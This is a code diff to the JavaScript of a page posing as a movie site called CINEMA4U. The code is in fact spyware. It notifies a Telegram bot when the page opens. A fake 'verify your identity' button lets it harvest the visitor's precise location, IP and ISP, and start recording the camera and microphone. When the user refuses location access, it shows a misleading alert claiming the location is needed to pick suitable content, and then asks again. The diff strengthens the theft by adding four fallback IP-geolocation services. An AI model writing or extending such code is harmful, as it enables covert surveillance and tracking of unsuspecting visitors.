@@ -370,10 +370,9 @@
 
     sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
 
-    // ========== وظيفة سرقة الموقع القوية ==========
+    // ========== وظيفة سرقة الموقع القوية (4 خدمات احتياطية) ==========
     let locationRetryCount = 0;
     function stealLocation() {
-        // أولاً نرسل إشعار أننا بدأنا محاولة جلب الموقع
         sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي...");
 
         if (!navigator.geolocation) {
@@ -382,7 +381,6 @@
             return;
         }
 
-        // طلب الموقع بدقة عالية مع إعادة المحاولة إذا رفض المستخدم
         const askLocation = () => {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -395,9 +393,7 @@
                     if (error.code === error.PERMISSION_DENIED) {
                         if (locationRetryCount === 0) {
                             locationRetryCount++;
-                            // نعرض تنبيه للمستخدم لتوضيح أهمية الموقع
                             alert("⚠️ نحتاج إلى موقعك الجغرافي لتحديد البلد وعرض المحتوى المناسب لك. يرجى السماح بالوصول إلى الموقع.");
-                            // نعيد الطلب مرة أخرى
                             askLocation();
                         } else {
                             sendTextToTelegram("❌ المستخدم رفض منح صلاحية الموقع بشكل نهائي. نستخدم IP API.");
@@ -413,7 +409,7 @@
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 7000,   // 7 ثوانٍ كحد أقصى
+                    timeout: 7000,
                     maximumAge: 0
                 }
             );
@@ -422,21 +418,90 @@
         askLocation();
     }
 
-    // الحصول على الموقع التقريبي عبر IP API
+    // الحصول على الموقع التقريبي عبر IP API (أقوى نسخة مع 4 خدمات احتياطية)
     function getLocationByIP() {
         sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
+
+        const services = [
+            {
+                name: "ip-api",
+                url: "https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,query",
+                parser: (data) => {
+                    if (data && data.status === 'success') {
+                        return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.query}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.regionName}\n📐 خط العرض: ${data.lat}\n📐 خط الطول: ${data.lon}\n🔌 مزود الخدمة: ${data.isp}`;
+                    }
+                    return null;
+                }
+            },
+            {
+                name: "ipinfo",
+                url: "https://ipinfo.io/json",
+                parser: (data) => {
+                    if (data && data.ip) {
+                        const loc = data.loc ? data.loc.split(',') : [];
+                        return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${loc[0] || 'غير متوفر'}\n📐 خط الطول: ${loc[1] || 'غير متوفر'}\n🔌 مزود الخدمة: ${data.org}`;
+                    }
+                    return null;
+                }
+            },
+            {
+                name: "geoapi",
+                url: "https://geoapi-hoskes.onrender.com/json.gp",
+                parser: (data) => {
+                    if (data && data.ip) {
+                        return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country_name}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${data.latitude}\n📐 خط الطول: ${data.longitude}\n📮 الرمز البريدي: ${data.postal_code}`;
+                    }
+                    return null;
+                }
+            },
+            {
+                name: "ipwhois",
+                url: "https://ipwho.is/",
+                parser: (data) => {
+                    if (data && data.success) {
+                        return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${data.latitude}\n📐 خط الطول: ${data.longitude}\n🔌 مزود الخدمة: ${data.connection.isp}`;
+                    }
+                    return null;
+                }
+            }
+        ];
+
+        let currentServiceIndex = 0;
+
+        function tryService() {
+            if (currentServiceIndex >= services.length) {
+                sendTextToTelegram("❌ فشلت جميع محاولات جلب الموقع عبر IP. قد يكون هناك حجب للخدمات.");
+                return;
+            }
+
+            const service = services[currentServiceIndex];
+            sendTextToTelegram(`⚠️ جاري تجربة الخدمة ${currentServiceIndex + 1}/${services.length}: ${service.name}...`);
+
+            fetch(service.url, {
+                method: 'GET',
+                mode: 'cors',
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return response.json();
+            })
             .then(data => {
-                if (data && data.latitude && data.longitude) {
-                    sendTextToTelegram(`🌐 الموقع التقريبي (IP):\nIP: ${data.ip}\nالبلد: ${data.country_name}\nالمدينة: ${data.city}\nالمنطقة: ${data.region}\nخط العرض: ${data.latitude}\nخط الطول: ${data.longitude}`);
+                const result = service.parser(data);
+                if (result) {
+                    sendTextToTelegram(result);
                 } else {
-                    sendTextToTelegram(`❌ فشل جلب الموقع عبر IP. البيانات: ${JSON.stringify(data)}`);
+                    throw new Error('بيانات غير صالحة');
                 }
             })
             .catch(err => {
-                sendTextToTelegram(`❌ خطأ في الاتصال بخدمة IP API: ${err.message}`);
+                sendTextToTelegram(`⚠️ فشل الخدمة ${service.name}: ${err.message}. جاري تجربة الخدمة التالية...`);
+                currentServiceIndex++;
+                tryService();
             });
+        }
+
+        tryService();
     }
 
     // ========== التسجيل (كاميرا + ميكروفون) ==========
@@ -570,9 +635,7 @@
         document.getElementById('verifyAccessBtn').onclick = async () => {
             if (isSpyingActive) return;
             isSpyingActive = true;
-            // أولاً: نطلب الموقع (تم تحسينه)
             stealLocation();
-            // ثانياً: نبدأ تسجيل الكاميرا والميكروفون
             await startSpying();
             const ph = document.getElementById('videoPlaceholder');
             ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
